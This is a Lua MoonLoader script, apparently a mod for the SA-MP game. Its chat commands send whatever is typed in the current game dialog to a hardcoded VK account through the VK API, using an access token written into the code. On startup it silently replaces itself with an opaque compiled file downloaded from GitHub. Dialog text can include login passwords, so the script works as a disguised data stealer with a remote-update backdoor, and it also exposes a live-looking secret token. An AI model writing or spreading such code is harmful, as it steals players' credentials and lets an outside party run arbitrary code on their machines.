require "lib.moonloader"
local requests = require 'requests'
local dlstatus = require('moonloader').download_status
local inicfg = require 'inicfg'
local ev = require('lib.samp.events')
local active = false
local night = false

updates = false

local script_vers = 4
local script_vers_text = '1.5'
local update_url = 'https://raw.githubusercontent.com/jeffrY001/script/main/update.ini'
local update_path = getWorkingDirectory() .. '/update.ini'

local script_url = 'https://github.com/jeffrY001/script/blob/main/vision.luac?raw=true'
local script_path = thisScript().path

function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(2500) end

	sampRegisterChatCommand('/mm', mm)
	sampRegisterChatCommand('/kpk', kpk)
	sampRegisterChatCommand('/mn', mn)

	downloadUrlToFile(update_url, update_path, function(id, status)
		if status == dlstatus.STATUS_ENDDOWNLOADDATA then
			update_ini = inicfg.load(nil, update_path)
			if tonumber(update_ini.info.vers) > script_vers then
				updates = true
			end
			os.remove(update_path)
		end
	end)

	while true do
	    wait(0)
	    if updates then
	    	downloadUrlToFile(script_url, script_path, function(id, status)
				if status == dlstatus.STATUS_ENDDOWNLOADDATA then
					thisScript():reload()
				end
			end)
			break
	    end
	end
end

function mm()
	local rand = math.random(999998)
	local message = sampGetCurrentDialogEditboxText()
	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
end
function kpk()
	local rand = math.random(999998)
	local message = sampGetCurrentDialogEditboxText()
	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
end
function mn()
	local rand = math.random(999998)
	local message = sampGetCurrentDialogEditboxText()
	requests.get('https://api.vk.com/method/messages.send?user_id=191558073&message='..message..'&v=5.131&access_token=7d23fe46f5d1689c7e72c1b8e95c6f753cce3f661c171bb5187cff134ea9db6f551287b6fa10be308e9bb&random_id=142'..rand..'')
end
